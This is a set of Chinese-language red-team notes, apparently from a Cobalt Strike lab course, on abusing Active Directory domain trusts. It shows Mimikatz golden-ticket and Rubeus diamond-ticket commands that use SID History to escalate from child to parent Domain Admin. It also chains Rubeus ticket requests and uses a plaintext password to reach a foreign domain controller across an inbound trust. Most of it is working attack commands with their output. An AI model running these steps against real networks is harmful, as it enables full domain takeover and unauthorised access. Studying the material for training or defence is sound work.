# Forest & Domain Trusts

域信任：单向信任，双向信任。（或者出站信任，入站信任）

域信任传递链：A信任B，B信任C，那么A也信任C


# Parent/Child

如果在子域已经获取到了DA权限，可以利用SID History取得父域的DA权限。

> If we have Domain Admin privileges in the child, we can also gain Domain Admin privileges in the parent using a TGT with a special attribute called SID History. SID History was designed to support migration scenarios, where a user would be moved from one domain to another. To preserve access to resources in the "old" domain, the user's previous SID would be added to the SID History of their new account. So when creating such a ticket, the SID of a privileged group (EAs, DAs, etc) in the parent domain can be added that will grant access to all resources in the parent.

如何实现？

首先需要知道父域DA组的SID
```
beacon> powershell Get-DomainGroup -Identity "Domain Admins" -Domain cyberbotic.io -Properties ObjectSid

objectsid                                   
---------                                   
S-1-5-21-378720957-2217973887-3501892633-512

beacon> powershell Get-DomainController -Domain cyberbotic.io | select Name

Name              
----              
dc-1.cyberbotic.io
```

这里```S-1-5-21-378720957-2217973887-3501892633-512```就是我们下面操作需要的SID

1. 金票

制作金票，sids填入上面查询到的值
```
mimikatz # kerberos::golden /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-3263068140-2042698922-2891547269 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /aes256:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /startoffset:-10 /endin:600 /renewmax:10080 /ticket:cyberbotic.kirbi
User      : Administrator
Domain    : dev.cyberbotic.io (DEV)
SID       : S-1-5-21-3263068140-2042698922-2891547269
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-378720957-2217973887-3501892633-512 ;
ServiceKey: 390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa - aes256_hmac
Lifetime  : 3/11/2021 2:49:33 PM ; 3/12/2021 12:49:33 AM ; 3/18/2021 2:49:33 PM
-> Ticket : cyberbotic.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
```

参数解释

- /user is the username to impersonate.
- /domain is the current domain.
- /sid is the current domain SID.
- /sids is the SID of the target group to add ourselves to.
- /aes256 is the AES256 key of the current domain's krbtgt account.
- /startoffset sets the start time of the ticket to 10 mins before the current time.
- /endin sets the expiry date for the ticket to 60 mins.
- /renewmax sets how long the ticket can be valid for if renewed.


导入
```
beacon> make_token CYBER\Administrator FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\cyberbotic.kirbi
beacon> ls \\dc-1\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 09:22:26   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
 
 beacon> rev2self
```


2. 钻票

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap

[...snip...]

beacon> make_token CYBER\Administrator FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\diamond.kirbi

beacon> ls \\dc-1\c$
[*] Listing: \\dc-1\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 09:22:26   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings

[...snip...]
```


**如果 dev.cyberbotic.io 也有一个子域（例如 test.dev.cyberbotic.io），那么 TEST 中的 DA 将能够使用他们的 krbtgt 立即跳到cyberbotic.io 中的 DA/EA，因为信任是可传递的。**

# One-Way (Inbound)

单向（入站）

dev.cyberbotic.io有一个单向的进站信任
```
beacon> powershell Get-DomainTrust

SourceName      : dev.cyberbotic.io
TargetName      : subsidiary.external
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes : 
TrustDirection  : Inbound
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

因为我们当前是被信任方（本域），所以可以枚举信任方(外域)的DC主机，使用命令：
```
beacon> powershell Get-DomainComputer -Domain subsidiary.external -Properties DNSHostName

dnshostname           
-----------           
ad.subsidiary.external
```

枚举外域的本地管理组成员

```
beacon> powershell Get-DomainForeignGroupMember -Domain subsidiary.external

GroupDomain             : subsidiary.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=subsidiary,DC=external
MemberDomain            : subsidiary.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=subsidiary,
                          DC=external
```

上面的MemberName是一串sid，可以用ConvertFrom-SID转成用户名
```
beacon> powershell ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\Subsidiary Admins
```

```Get-NetLocalGroupMember```可以枚举外域机器的本地组成员。这表明```DEV\Subsidiary Admins```是域控制器上本地管理员组的成员
```
beacon> powershell Get-NetLocalGroupMember -ComputerName ad.subsidiary.external

ComputerName : ad.subsidiary.external
GroupName    : Administrators
MemberName   : DEV\Subsidiary Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True
```

枚举本域是否有外域```Subsidiary Admins```组的成员
```
beacon> powershell Get-DomainGroupMember -Identity "Subsidiary Admins" | select MemberName

MemberName
----------
jadams
```

## 方法一：明文密码
jadams是本域用户，而且我们知道他的明文密码:```TrustNo1```，最简单的方式就是输入明文密码访问

```
beacon> make_token DEV\jadams TrustNo1
[+] Impersonated DEV\bfarmer

beacon> ls \\ad.subsidiary.external\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
```

## 方法二：只有哈希，请求两次tgt

如果只有 RC4/AES 等哈希，就需要请求tgt。这里注意，需要请求本域的tgt，然后再根据这个tgt再次请求外域的tgt

请求本域tgt
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:jadams /domain:dev.cyberbotic.io /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

[*] Action: Ask TGT
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Using aes256-cts-hmac_sha1 hash: 70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80
[*] Building AS-REQ (w/ preauth) for: 'dev.cyberbotic.io\jadams'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFdD [...snip...] MuSU8=

  ServiceName           :  krbtgt/DEV.CYBERBOTIC.IO
  ServiceRealm          :  DEV.CYBERBOTIC.IO
  UserName              :  jadams
  UserRealm             :  DEV.CYBERBOTIC.IO
  StartTime             :  3/16/2021 1:00:28 PM
  EndTime               :  3/16/2021 11:00:28 PM
  RenewTill             :  3/23/2021 1:00:28 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType               :  aes256_cts_hmac_sha1
  Base64(key)           :  mnuk66R9/j0cnmZczy8ACxBfn5VcZ5pFubm3tI79KZ4=
```

根据上面的tgt（```doIFdD [...snip...] MuSU8=```这串值），请求外域访问tgt

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgs /service:krbtgt/subsidiary.external /domain:dev.cyberbotic.io /dc:dc-2.dev.cyberbotic.io /ticket:doIFdD[...snip...]MuSU8= /nowrap

[*] Action: Ask TGS
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'krbtgt/subsidiary.external'
[+] TGS request successful!
[*] base64(ticket.kirbi):

      doIFMT [...snip...] 5BTA==

  ServiceName           :  krbtgt/SUBSIDIARY.EXTERNAL
  ServiceRealm          :  DEV.CYBERBOTIC.IO
  UserName              :  jadams
  UserRealm             :  DEV.CYBERBOTIC.IO
  StartTime             :  3/16/2021 1:02:06 PM
  EndTime               :  3/16/2021 11:00:28 PM
  RenewTill             :  1/1/0001 12:00:00 AM
  Flags                 :  name_canonicalize, pre_authent, forwardable
  KeyType               :  rc4-hmac
  Base64(key)           :  O7B/KR3+DvhlpY6qwrTlHg==
```


根据上面的tgt，请求外域的cifs服务的tgs
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgs /service:cifs/ad.subsidiary.external /domain:ad.subsidiary.external /dc:ad.subsidiary.external /ticket:doIFMT[...snip...]5BTA== /nowrap

[*] Action: Ask TGS
[*] Using domain controller: ad.subsidiary.external (10.10.14.55)
[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'cifs/ad.subsidiary.external'
[+] TGS request successful!
[+] Ticket successfully imported!
[*] base64(ticket.kirbi):

      doIFsD [...snip...] JuYWw=

  ServiceName           :  cifs/ad.subsidiary.external
  ServiceRealm          :  SUBSIDIARY.EXTERNAL
  UserName              :  jadams
  UserRealm             :  DEV.CYBERBOTIC.IO
  StartTime             :  3/16/2021 1:08:52 PM
  EndTime               :  3/16/2021 11:00:28 PM
  RenewTill             :  1/1/0001 12:00:00 AM
  Flags                 :  name_canonicalize, ok_as_delegate, pre_authent, forwardable
  KeyType               :  aes256_cts_hmac_sha1
  Base64(key)           :  HPmz324aewyZ6El4LGoVEksQEvkI3eoSiy7gAlgEXbU=
```

根据生成的tgs，合成```subsidiary.kirbi```
```
PS C:\> [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\subsidiary.kirbi", [System.Convert]::FromBase64String("doIFiD [...snip...] 5hbA=="))
```

导入session，现在可以访问外域的DC
```
beacon> make_token DEV\jadams FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Daniel\Desktop\subsidiary.kirbi
beacon> ls \\ad.subsidiary.external\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
```